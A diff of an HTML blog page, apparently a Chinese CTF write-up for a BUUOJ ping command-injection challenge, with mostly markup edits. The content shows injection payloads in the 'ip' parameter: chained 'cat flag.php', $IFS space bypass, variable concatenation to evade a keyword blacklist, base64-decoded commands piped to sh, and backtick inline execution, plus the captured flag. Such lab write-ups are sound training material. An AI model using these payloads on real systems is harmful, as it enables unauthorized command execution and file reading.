+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">http</span><span class="o">://</span><span class="mi">7</span><span class="nx">c978af9</span><span class="o">-</span><span class="mi">6</span><span class="nx">d67</span><span class="o">-</span><span class="mi">47</span><span class="nx">d4</span><span class="o">-</span><span class="mi">9</span><span class="nx">b75</span><span class="o">-</span><span class="mi">3086293</span><span class="nx">f8b18</span><span class="o">.</span><span class="nx">node3</span><span class="o">.</span><span class="nx">buuoj</span><span class="o">.</span><span class="nx">cn</span><span class="o">/?</span><span class="nx">ip</span><span class="o">=</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="o">||</span><span class="nx">cat</span> <span class="o">/</span><span class="nx">flag</span><span class="o">.</span><span class="nx">php</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">http</span><span class="o">://</span><span class="mi">7</span><span class="nx">c978af9</span><span class="o">-</span><span class="mi">6</span><span class="nx">d67</span><span class="o">-</span><span class="mi">47</span><span class="nx">d4</span><span class="o">-</span><span class="mi">9</span><span class="nx">b75</span><span class="o">-</span><span class="mi">3086293</span><span class="nx">f8b18</span><span class="o">.</span><span class="nx">node3</span><span class="o">.</span><span class="nx">buuoj</span><span class="o">.</span><span class="nx">cn</span><span class="o">/?</span><span class="nx">ip</span><span class="o">=</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="o">||</span><span class="nx">cat</span> <span class="o">/</span><span class="nx">flag</span><span class="o">.</span><span class="nx">php</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p><code>/?ip= 1fxck your symbol!</code>报错提示：空格被过滤了</p>
 <p>尝试了各种空格绕过都不行，先去看一下index.php文件：</p>
-<pre><code class="language-php+HTML" data-lang="php+HTML">http://7c978af9-6d67-47d4-9b75-3086293f8b18.node3.buuoj.cn/?ip=127.0.0.1||cat$IFS$1index.php
+<pre tabindex="0"><code class="language-php+HTML" data-lang="php+HTML">http://7c978af9-6d67-47d4-9b75-3086293f8b18.node3.buuoj.cn/?ip=127.0.0.1||cat$IFS$1index.php
 </code></pre><div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1689,7 +1689,7 @@ srv
 </span><span class="lnt">22
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">/?</span><span class="nx">ip</span><span class="o">=</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">/?</span><span class="nx">ip</span><span class="o">=</span>
 
 <span class="nx">PING</span> <span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span> <span class="p">(</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">)</span><span class="o">:</span> <span class="mi">56</span> <span class="nx">data</span> <span class="nx">bytes</span>
 <span class="o">/?</span><span class="nx">ip</span><span class="o">=</span>
@@ -1719,31 +1719,31 @@ srv
 <p>我们看到源码中有一个$a变量可以覆盖，黑名单绕过</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">/?</span><span class="nx">ip</span><span class="o">=</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">;</span><span class="nx">a</span><span class="o">=</span><span class="nx">g</span><span class="p">;</span><span class="nx">cat</span><span class="nv">$IFS</span><span class="err">$</span><span class="mi">1</span><span class="nx">fla</span><span class="nv">$a</span><span class="o">.</span><span class="nx">php</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">/?</span><span class="nx">ip</span><span class="o">=</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">;</span><span class="nx">a</span><span class="o">=</span><span class="nx">g</span><span class="p">;</span><span class="nx">cat</span><span class="nv">$IFS</span><span class="err">$</span><span class="mi">1</span><span class="nx">fla</span><span class="nv">$a</span><span class="o">.</span><span class="nx">php</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p>查看源代码，拿到FLAG：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">flag</span><span class="p">{</span><span class="mi">6</span><span class="n">af78fe9</span><span class="o">-</span><span class="mi">897</span><span class="n">f</span><span class="o">-</span><span class="mi">442</span><span class="n">a</span><span class="o">-</span><span class="mi">924</span><span class="n">a</span><span class="o">-</span><span class="n">d9fa2dab6f73</span><span class="p">}</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">flag</span><span class="p">{</span><span class="mi">6</span><span class="n">af78fe9</span><span class="o">-</span><span class="mi">897</span><span class="n">f</span><span class="o">-</span><span class="mi">442</span><span class="n">a</span><span class="o">-</span><span class="mi">924</span><span class="n">a</span><span class="o">-</span><span class="n">d9fa2dab6f73</span><span class="p">}</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><h4 id="font-colorffa500-方法二黑名单绕过base64sh脚本font"><a href="#font-colorffa500-方法二黑名单绕过base64sh脚本font" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:font-colorffa500-方法二黑名单绕过base64sh脚本font" class="headings"><font color=#FFA500> 方法二：黑名单绕过：base64，sh脚本</font></a></h4>
 <p>bash被过滤了?那就用sh。sh的大部分脚本都可以在bash下运行。</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="c1"># echo &#34;bHM=&#34; | base64 -d
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="c1"># echo &#34;bHM=&#34; | base64 -d
 </span><span class="c1"># 将 cat flag.php 进行base64编码
 </span><span class="c1"></span><span class="k">echo</span><span class="nv">$IFS</span><span class="err">$</span><span class="mi">1</span><span class="nx">Y2F0IGZsYWcucGhw</span><span class="o">|</span><span class="nx">base64</span><span class="nv">$IFS</span><span class="err">$</span><span class="mi">1</span><span class="o">-</span><span class="nx">d</span><span class="o">|</span><span class="nx">sh</span>
 </code></pre></td></tr></table></div>
@@ -1754,16 +1754,16 @@ srv
 <p>因为 ls 命令能够拿到目录下的文件：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">http</span><span class="o">://</span><span class="mi">7</span><span class="nx">c978af9</span><span class="o">-</span><span class="mi">6</span><span class="nx">d67</span><span class="o">-</span><span class="mi">47</span><span class="nx">d4</span><span class="o">-</span><span class="mi">9</span><span class="nx">b75</span><span class="o">-</span><span class="mi">3086293</span><span class="nx">f8b18</span><span class="o">.</span><span class="nx">node3</span><span class="o">.</span><span class="nx">buuoj</span><span class="o">.</span><span class="nx">cn</span><span class="o">/?</span><span class="nx">ip</span><span class="o">=</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="o">||</span><span class="nx">ls</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">http</span><span class="o">://</span><span class="mi">7</span><span class="nx">c978af9</span><span class="o">-</span><span class="mi">6</span><span class="nx">d67</span><span class="o">-</span><span class="mi">47</span><span class="nx">d4</span><span class="o">-</span><span class="mi">9</span><span class="nx">b75</span><span class="o">-</span><span class="mi">3086293</span><span class="nx">f8b18</span><span class="o">.</span><span class="nx">node3</span><span class="o">.</span><span class="nx">buuoj</span><span class="o">.</span><span class="nx">cn</span><span class="o">/?</span><span class="nx">ip</span><span class="o">=</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="o">||</span><span class="nx">ls</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p>flag.php
 index.php</p>
 <p>所以使用内联执行，flag.php 会被作为输入执行，以获取 flag.</p>
-<pre><code>http://7c978af9-6d67-47d4-9b75-3086293f8b18.node3.buuoj.cn/?ip=127.0.0.1;cat$IFS$1`ls`
+<pre tabindex="0"><code>http://7c978af9-6d67-47d4-9b75-3086293f8b18.node3.buuoj.cn/?ip=127.0.0.1;cat$IFS$1`ls`
 </code></pre><p>查看网页源代码，拿到flag。</p>
 
             </div>
@@ -1818,6 +1818,10 @@ index.php</p>
                     </li>
                 
                     <li class="related-item">
+                        <a href="/posts/buumisc%E9%80%9A%E5%85%B39/" class="related-link">BUUMisc通关9</a>
+                    </li>
+                
+                    <li class="related-item">
                         <a href="/posts/buumisc%E9%80%9A%E5%85%B38/" class="related-link">BUUMisc通关8</a>
                     </li>
                 
@@ -1827,10 +1831,6 @@ index.php</p>
                 
                     <li class="related-item">
                         <a href="/posts/buumisc%E9%80%9A%E5%85%B36/" class="related-link">BUUMisc通关6</a>
-                    </li>
-                
-                    <li class="related-item">
-                        <a href="/posts/buumisc%E9%80%9A%E5%85%B35/" class="related-link">BUUMisc通关5</a>
                     </li>
                 
             </ul>
